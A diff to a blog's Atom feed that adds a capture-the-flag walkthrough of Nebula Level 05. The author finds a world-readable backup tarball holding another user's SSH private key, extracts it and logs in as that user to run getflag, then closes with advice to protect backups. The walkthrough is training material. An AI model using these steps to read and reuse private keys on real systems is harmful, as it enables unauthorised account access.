@@ -1,4 +1,118 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2020-04-27T21:20:23-05:00</updated><id>/feed.xml</id><title type="html">mythicalbits.github.io</title><entry><title type="html">Nebula Series - Level 04</title><link href="/2020/04/27/nebula-04.html" rel="alternate" type="text/html" title="Nebula Series - Level 04" /><published>2020-04-27T00:00:00-05:00</published><updated>2020-04-27T00:00:00-05:00</updated><id>/2020/04/27/nebula-04</id><content type="html" xml:base="/2020/04/27/nebula-04.html">&lt;p&gt;&lt;em&gt;Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2020-05-04T21:29:13-05:00</updated><id>/feed.xml</id><title type="html">mythicalbits.github.io</title><entry><title type="html">Nebula Series - Level 05</title><link href="/2020/05/04/nebula-05.html" rel="alternate" type="text/html" title="Nebula Series - Level 05" /><published>2020-05-04T00:00:00-05:00</published><updated>2020-05-04T00:00:00-05:00</updated><id>/2020/05/04/nebula-05</id><content type="html" xml:base="/2020/05/04/nebula-05.html">&lt;p&gt;&lt;em&gt;Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range
+in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file
+system race conditions.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Level 05&lt;/strong&gt; reminds us to lock down our backups&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;Ok, so the first thing to understand is that you need to secure your backups. The instructions for this level suggest we keep an eye out for weak permissions. Easy enough, let’s
+take a look at the target user’s home directory&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level05@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At first glance it doesn’t seem like there’s anything there but if we include the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt; flag to list
+hidden files (aka dotfiles) we see some interesting directories:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level05@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 9
+drwxr-x--- 1 flag05 level05   80 2020-04-27 20:02 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 flag05 flag05    23 2020-04-27 20:02 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
+drwx------ 2 flag05 flag05    60 2020-04-27 20:02 .cache
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 flag05 flag05   675 2011-05-18 02:54 .profile
+drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.backup&lt;/code&gt; looks promising – it’s readable by anyone – let’s see what was backed up.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level05@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home/flag05/.backup/
+total 2
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-x--- 1 flag05 level05   80 2020-04-27 20:02 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A tarball… whats it hold? We can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-t&lt;/code&gt; to list the files in an archive and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-f&lt;/code&gt; to
+specify which archive&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level05@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-tf&lt;/span&gt; /home/flag05/.backup/backup-19072011.tgz
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There they are! The keys to the castle! Let’s extract them to a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/flag05keys&lt;/code&gt; directory in our
+home. Here, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-x&lt;/code&gt; indicates we want to extract the files, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v&lt;/code&gt; enables verbose output, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-f&lt;/code&gt;
+again identifies the archive we’re working with, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-C&lt;/code&gt; allows us to specify where the extracted
+files should go. tar won’t create the directory for us though so we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir ~/flag05keys&lt;/code&gt; first.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level05@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; ~/flag05keys &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xvf&lt;/span&gt; /home/flag05/.backup/backup-19072011.tgz &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; ~/flag05keys
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s check that the public key is the same as the one in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ssh/authorized_keys&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level05@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;diff ~/flag05keys/.ssh/authorized_keys ~/flag05keys/.ssh/id_rsa.pub
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No output indicates these files are identical. That means, if this “backup” is an accurate
+representation of our target’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ssh&lt;/code&gt;, we can connect as flag05 over &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; by providing this private
+key with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-i&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level05@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ~/flag05keys/.ssh/id_rsa flag05@localhost
+
+The authenticity of host localhost &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; cant be established.
+ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+Are you sure you want to &lt;span class=&quot;k&quot;&gt;continue &lt;/span&gt;connecting &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;/no&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;? &lt;span class=&quot;nb&quot;&gt;yes
+&lt;/span&gt;Warning: Permanently added localhost &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
+
+      _   __     __          __
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; __ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; / / / / __ &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;/
+   / /|  /  __/ /_/ / /_/ / / /_/ /
+  /_/ |_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/_.___/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_/_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_/
+
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;, use the username of &lt;span class=&quot;s2&quot;&gt;&quot;levelXX&quot;&lt;/span&gt; and password &lt;span class=&quot;s2&quot;&gt;&quot;levelXX&quot;&lt;/span&gt;, where
+XX is the level number.
+
+Currently there are 20 levels &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;00 - 19&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+
+Welcome to Ubuntu 11.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 3.0.0-12-generic i686&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com/
+New release &lt;span class=&quot;s1&quot;&gt;'12.04 LTS'&lt;/span&gt; available.
+Run &lt;span class=&quot;s1&quot;&gt;'do-release-upgrade'&lt;/span&gt; to upgrade to it.
+
+flag05@nebula:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It worked! Now that we’re user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag05&lt;/code&gt;, we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getflag&lt;/code&gt; and move on.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flag05@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In Summary:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Security is about the weakest link – protect your backups&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file system race conditions. Level 05 reminds us to lock down our backups</summary></entry><entry><title type="html">Nebula Series - Level 04</title><link href="/2020/04/27/nebula-04.html" rel="alternate" type="text/html" title="Nebula Series - Level 04" /><published>2020-04-27T00:00:00-05:00</published><updated>2020-04-27T00:00:00-05:00</updated><id>/2020/04/27/nebula-04</id><content type="html" xml:base="/2020/04/27/nebula-04.html">&lt;p&gt;&lt;em&gt;Nebula is the first in a series of VMs from Exploit Exercises. It consists of 20 levels which range
 in difficulty from simple to intermediate and cover topics like Linux privilege escalation and file
 system race conditions.&lt;/em&gt;&lt;/p&gt;
 
